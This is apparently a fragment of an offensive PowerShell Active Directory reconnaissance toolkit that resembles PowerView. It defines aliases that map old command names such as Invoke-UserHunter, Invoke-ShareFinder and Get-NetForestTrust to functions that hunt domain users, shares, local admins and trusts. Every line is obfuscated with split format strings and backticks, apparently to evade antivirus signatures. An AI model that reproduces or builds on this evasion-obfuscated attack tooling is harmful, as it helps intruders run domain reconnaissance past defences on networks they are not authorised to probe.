&("{2}{1}{0}"-f'as','li','Set-A') ("{4}{3}{0}{1}{2}"-f'tP','ro','cess','t-Ne','Ge') ("{2}{0}{3}{1}"-f't-WMI','ss','Ge','Proce')
&("{0}{2}{1}" -f 'Set-','as','Ali') ("{1}{4}{3}{5}{0}{2}{6}" -f 'u','I','nctio','voke-','n','ThreadedF','n') Ne`W-th`REa`DE`DFu`NCTI`oN
&("{1}{0}{2}"-f'et','S','-Alias') ("{0}{2}{1}{3}"-f 'I','voke-UserHunt','n','er') ("{3}{0}{2}{1}{4}{6}{5}"-f'd-Do','c','mainUserLo','Fin','a','ion','t')
&("{0}{2}{1}" -f'Set-','lias','A') ("{5}{0}{2}{3}{4}{1}{6}"-f 'ro','u','ce','ss','H','Invoke-P','nter') ("{4}{0}{2}{5}{3}{1}"-f 'ind','ocess','-Dom','r','F','ainP')
&("{0}{1}{2}"-f 'Set-A','lia','s') ("{0}{3}{4}{2}{5}{1}"-f 'Invo','nter','ve','ke-','E','ntHu') ("{3}{2}{4}{0}{1}" -f 've','nt','d-DomainUser','Fin','E')
&("{1}{2}{0}"-f 'Alias','S','et-') ("{3}{0}{1}{4}{2}"-f 'e-','Shar','der','Invok','eFin') ("{4}{0}{2}{3}{1}"-f 'nd-Do','Share','mai','n','Fi')
&("{2}{1}{0}"-f'as','li','Set-A') ("{0}{4}{1}{3}{2}"-f 'In','F','r','ileFinde','voke-') ("{4}{7}{6}{5}{0}{3}{2}{1}" -f'ha','le','i','reF','Find-Int','ainS','Dom','eresting')
&("{0}{2}{1}" -f'Set-A','as','li') ("{3}{6}{4}{5}{1}{8}{2}{7}{0}" -f 'in','a','d','Invoke-','me','r','Enu','m','teLocalA') ("{0}{1}{2}{4}{5}{3}"-f 'Find-Do','ma','inLo','pMember','calG','rou')
&("{2}{0}{1}"-f 'et-Ali','as','S') ("{4}{0}{3}{1}{2}"-f't-Net','mainTru','st','Do','Ge') ("{1}{2}{0}"-f'rust','Get-Doma','inT')
&("{0}{2}{1}" -f'S','ias','et-Al') ("{5}{4}{1}{3}{0}{2}" -f 'Trus','et','t','Forest','t-N','Ge') ("{2}{1}{3}{0}"-f'ust','re','Get-Fo','stTr')
&("{1}{3}{0}{2}" -f'-Al','S','ias','et') ("{2}{4}{0}{3}{1}"-f 'For','nUser','Fin','eig','d-') ("{2}{1}{4}{3}{0}"-f 'User','inF','Get-Doma','gn','orei')
&("{2}{1}{0}"-f's','et-Alia','S') ("{1}{3}{2}{0}" -f 'oup','Fi','-ForeignGr','nd') ("{8}{5}{4}{6}{7}{0}{2}{3}{1}" -f 'gnG','er','ro','upMemb','m','Do','ainFo','rei','Get-')
&("{3}{0}{1}{2}"-f '-','Al','ias','Set') ("{4}{3}{1}{5}{0}{2}"-f 's','e-Ma','t','nvok','I','pDomainTru') ("{2}{0}{6}{4}{3}{5}{1}"-f't-Do','g','Ge','rustMa','T','ppin','main')
&("{0}{1}{2}"-f'S','et','-Alias') ("{0}{1}{3}{2}" -f'Get-D','o','y','mainPolic') ("{0}{3}{2}{1}" -f 'Ge','a','olicyDat','t-DomainP')

